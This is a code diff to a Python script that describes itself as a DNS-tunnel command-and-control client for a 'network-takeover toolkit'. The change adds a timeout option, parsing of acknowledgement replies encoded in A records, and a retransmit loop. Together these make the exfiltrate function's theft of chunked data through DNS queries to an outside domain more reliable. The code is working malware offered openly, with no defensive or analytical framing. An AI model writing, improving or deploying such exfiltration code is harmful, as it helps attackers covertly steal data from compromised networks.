@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# v1.2
+# v1.3
 """
 dns_c2.py — DNS tunnel C2 client for the network-takeover toolkit.
 
@@ -99,7 +99,8 @@ def gen_agent_id() -> str:
 
 # ── Raw DNS helpers ────────────────────────────────────────────────────────────
 
-def _dns_send(qname: str, qtype: str, dns_server: str, wait_reply: bool):
+def _dns_send(qname: str, qtype: str, dns_server: str, wait_reply: bool,
+              timeout: float = 5.0):
     """
     Build a DNS query with Scapy and send it via an OS UDP socket so the
     packet travels through the normal network stack — VPN routing applies,
@@ -107,7 +108,7 @@ def _dns_send(qname: str, qtype: str, dns_server: str, wait_reply: bool):
     """
     pkt = DNS(id=random.randint(0, 65535), rd=1, qd=DNSQR(qname=qname, qtype=qtype))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.settimeout(5)
+    sock.settimeout(timeout)
     try:
         sock.sendto(bytes(pkt), (dns_server, 53))
         if not wait_reply:
@@ -118,6 +119,30 @@ def _dns_send(qname: str, qtype: str, dns_server: str, wait_reply: bool):
         return None
     finally:
         sock.close()
+
+
+def _parse_ack_ip(resp) -> list[int] | None:
+    """
+    Extract the 4-octet ACK status from a DNS A record response.
+
+    Encoding (set by c2_server._resp_ack_status):
+      octet[0] == 1  → session complete
+      octet[0] == 0  → missing chunk at index (octet[2]<<8)|octet[3]
+                        octet[1] = received count mod 256
+
+    Returns list of 4 ints, or None on parse failure.
+    """
+    try:
+        rdata = resp[DNS].an.rdata
+        if isinstance(rdata, str):
+            parts = [int(x) for x in rdata.split(".")]
+        elif isinstance(rdata, bytes) and len(rdata) == 4:
+            parts = list(rdata)
+        else:
+            return None
+        return parts if len(parts) == 4 else None
+    except Exception:
+        return None
 
 
 def _query_a(qname: str, dns_server: str) -> None:
@@ -171,10 +196,39 @@ def exfiltrate(data, domain: str, dns_server: str, session_id: str = None) -> st
     chunks = [encoded[i : i + CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]
     total = len(chunks)
     print(f"[C2] Exfiltrating {len(data)}B → {total} chunk(s)  session={session_id}")
+
+    # Chunk indices are 0-based on both ends: client sends 0..total-1,
+    # server stores by index and reassembles with range(total). No off-by-one.
     for idx, chunk in enumerate(chunks):
         _query_a(f"{chunk}.{idx}.{total}.{session_id}.{domain}", dns_server)
         time.sleep(QUERY_DELAY)
-    print(f"[C2] Exfiltration done  session={session_id}")
+
+    # ACK / retransmit loop — query ack.<sid>.<domain> until server confirms
+    # all chunks received, retransmitting each reported gap one at a time.
+    # Use a short timeout so a lost ack query doesn't stall for 5s.
+    max_attempts = max(total * 2, 10)
+    for attempt in range(max_attempts):
+        time.sleep(QUERY_DELAY)
+        resp = _dns_send(
+            f"ack.{session_id}.{domain}", "A", dns_server,
+            wait_reply=True, timeout=2.0,
+        )
+        octets = _parse_ack_ip(resp)
+        if octets is None:
+            continue                        # ack query lost — retry
+        if octets[0] == 1:
+            print(f"[C2] Session {session_id} confirmed complete ({attempt + 1} ack round(s))")
+            break
+        missing = (octets[2] << 8) | octets[3]
+        if missing < total:
+            print(f"[C2] Retransmitting chunk {missing}/{total - 1}  session={session_id}")
+            _dns_send(
+                f"{chunks[missing]}.{missing}.{total}.{session_id}.{domain}",
+                "A", dns_server, wait_reply=False,
+            )
+    else:
+        print(f"[C2] Warning: session {session_id} may be incomplete after {max_attempts} attempts")
+
     return session_id
 
 
